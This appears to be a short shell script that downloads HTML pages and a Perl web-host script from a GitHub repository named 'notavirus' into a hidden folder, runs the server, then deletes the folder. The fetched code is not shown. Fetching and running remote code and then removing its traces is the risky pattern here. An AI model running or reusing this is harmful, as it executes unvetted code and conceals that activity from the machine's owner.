
cd ~/.webHost

#Download html
curl https://raw.githubusercontent.com/pointfour/notavirus/master/hi.html > hi.html

curl https://raw.githubusercontent.com/pointfour/notavirus/master/running_command.html > running_command.html

#Download scripts
curl https://raw.githubusercontent.com/pointfour/notavirus/master/perlWebHost.pl > perlWebHost.pl

#Start webhost
perl perlWebHost.pl

cd ..
rm -rf .webHost
